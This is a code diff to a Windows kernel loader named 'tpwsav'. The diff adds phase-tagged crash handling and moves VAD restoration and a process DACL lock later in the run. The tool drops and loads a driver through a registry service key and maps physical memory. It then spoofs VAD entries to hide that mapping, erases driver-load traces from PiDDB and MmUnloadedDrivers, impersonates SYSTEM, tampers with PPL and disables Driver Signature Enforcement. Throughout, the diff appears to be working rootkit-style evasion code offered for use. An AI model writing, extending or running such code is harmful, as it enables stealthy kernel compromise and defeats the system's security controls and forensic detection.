@@ -84,7 +84,98 @@ static bool RelaunchElevated() {
     return true;
 }
 
+// --- crash reporting -------------------------------------------------------
+//
+// The window/VAD work faults on purpose (the VADs behind the 1 GiB views are
+// deliberately truncated), so a failure there used to take the process down with
+// an unhandled STATUS_ACCESS_VIOLATION: the console closed and the only trace
+// was in the system log. Every phase is tagged and Run() traps the exception
+// so a crash says where it happened, then puts the VAD tree back the way it
+// was - a process that exits with a truncated VAD still backed by a live
+// section is a bugcheck waiting to happen in the section teardown path.
+
+enum RunPhase {
+    PH_STARTUP, PH_DROP, PH_LOAD, PH_WINDOW, PH_SPOOF, PH_CLEANUP,
+    PH_UNLOAD, PH_RESTORE, PH_PPL, PH_VERIFY, PH_DSE, PH_DACL, PH_DONE
+};
+
+static RunPhase g_Phase = PH_STARTUP;
+static EXCEPTION_POINTERS* g_LastException = NULL;
+
+static const char* PhaseName(RunPhase p) {
+    switch (p) {
+        case PH_STARTUP: return "startup / offset resolution";
+        case PH_DROP:    return "driver drop / service registry";
+        case PH_LOAD:    return "driver load / device open";
+        case PH_WINDOW:  return "physical window setup";
+        case PH_SPOOF:   return "VAD spoof";
+        case PH_CLEANUP: return "PiDDB / MmUnloadedDrivers cleanup";
+        case PH_UNLOAD:  return "driver unload";
+        case PH_RESTORE: return "VAD restore";
+        case PH_PPL:     return "SYSTEM impersonation / PPL";
+        case PH_VERIFY:  return "verification";
+        case PH_DSE:     return "DSE disable";
+        case PH_DACL:    return "process DACL lock";
+        case PH_DONE:    return "shutdown";
+    }
+    return "unknown";
+}
+
+// No CRT in the crash path: the heap may be exactly what is broken.
+static void RawWrite(const char* text) {
+    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
+    if (h == INVALID_HANDLE_VALUE || h == NULL) return;
+    DWORD written = 0;
+    WriteFile(h, text, (DWORD)lstrlenA(text), &written, NULL);
+}
+
+static int CrashFilter(EXCEPTION_POINTERS* ep) {
+    g_LastException = ep;
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
+// Restoring the VADs only writes pages that were already faulted in, but guard
+// it anyway: this runs from an exception handler.
+static void SafeRestore() {
+    __try {
+        RestorePhysWindow();
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        RawWrite("\r\n[!!!] VAD restore faulted too - the window itself is unusable\r\n");
+    }
+}
+
+static void ReportCrash() {
+    // GetExceptionCode() is an intrinsic and may only be used directly inside a
+    // __except block, so read the code off the stashed record instead.
+    ULONG code = 0;
+    ULONG64 rip = 0;
+    if (g_LastException) {
+        code = (ULONG)g_LastException->ExceptionRecord->ExceptionCode;
+        rip = (ULONG64)g_LastException->ContextRecord->Rip;
+    }
+    char buf[320] = {};
+    int n = wsprintfA(buf,
+        "\r\n[!!!] CRASH 0x%08lX at RIP 0x%llX during: %s\r\n"
+        "[!!!] %u VAD patch(es) still applied - restoring them now\r\n",
+        (unsigned long)code, (unsigned long long)rip, PhaseName(g_Phase),
+        (unsigned)WindowVadPatchCount());
+    RawWrite(buf);
+    SafeRestore();
+}
+
+static int RunBody();
+
 static int Run() {
+    __try {
+        return RunBody();
+    }
+    __except (CrashFilter(GetExceptionInformation())) {
+        ReportCrash();
+        return 3;
+    }
+}
+
+static int RunBody() {
     printf("[*] tpwsav\n\n");
 
     printf("[*] Resolving syscalls...\n");
@@ -120,6 +211,7 @@ static int Run() {
     }
 
     printf("\n[*] Dropping driver to temp...\n");
+    g_Phase = PH_DROP;
 
     wchar_t tempDir[MAX_PATH] = {};
     GetTempPathW(MAX_PATH, tempDir);
@@ -258,6 +350,7 @@ static int Run() {
     printf("[+] Service key created\n");
 
     printf("\n[*] Loading driver...\n");
+    g_Phase = PH_LOAD;
 
     UNICODE_STRING servicePath;
     InitUnicodeString(&servicePath, svcRegPath);
@@ -319,13 +412,16 @@ static int Run() {
     }
     printf("[+] System CR3: 0x%llX\n", systemCr3);
 
+    g_Phase = PH_WINDOW;
     if (!SetupPhysWindow(deviceHandle, &sc, systemCr3, &kOffsets)) {
         printf("[-] Failed to set up physical memory window\n");
         return 1;
     }
 
+    g_Phase = PH_SPOOF;
     SpoofWindowVADs(deviceHandle, &sc, systemCr3, &kOffsets);
 
+    g_Phase = PH_CLEANUP;
     printf("\n[*] Trace cleanup\n");
 
     wchar_t driverFileName[64] = {};
@@ -335,6 +431,7 @@ static int Run() {
     MmCleanupContext mmCtx = {};
     bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets, &mmCtx);
 
+    g_Phase = PH_UNLOAD;
     printf("\n[*] Unloading driver...\n");
     DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);
 
@@ -360,6 +457,15 @@ static int Run() {
     }
     printf("[+] Registry key deleted\n");
 
+    // Put the VADs back as soon as the hidden-window work is done. Everything
+    // below still walks the window (PPL, DSE, verification), and a VAD tree
+    // that claims 64 KiB for a 1 GiB section is exactly what makes those steps
+    // fault. Restoring here also means the process can never exit - cleanly or
+    // not - with a truncated VAD still in place.
+    g_Phase = PH_RESTORE;
+    RestorePhysWindow();
+
+    g_Phase = PH_PPL;
     if (!ImpersonateSystem())
         printf("[-] Failed to impersonate SYSTEM\n");
 
@@ -391,8 +497,7 @@ static int Run() {
         }
     }
 
-    LockProcessDACL();
-
+    g_Phase = PH_VERIFY;
     printf("\n[*] Verification\n");
 
     __try {
@@ -437,11 +542,19 @@ static int Run() {
     printf("\n[+] Tpwsav loader complete\n");
     printf("[+] System CR3: 0x%llX\n", systemCr3);
 
+    g_Phase = PH_DSE;
     DisableDSE(systemCr3, &kOffsets);
 
+    // Last: the deny ACE covers this process too, so nothing that needs to open
+    // it may run after this point.
+    g_Phase = PH_DACL;
+    LockProcessDACL();
+
+    g_Phase = PH_DONE;
     printf("\n[*] Press Enter to exit...\n");
     (void)getchar();
 
+    // No-op unless a crash path left something patched, but keep it as a net.
     RestorePhysWindow();
     return 0;
 }
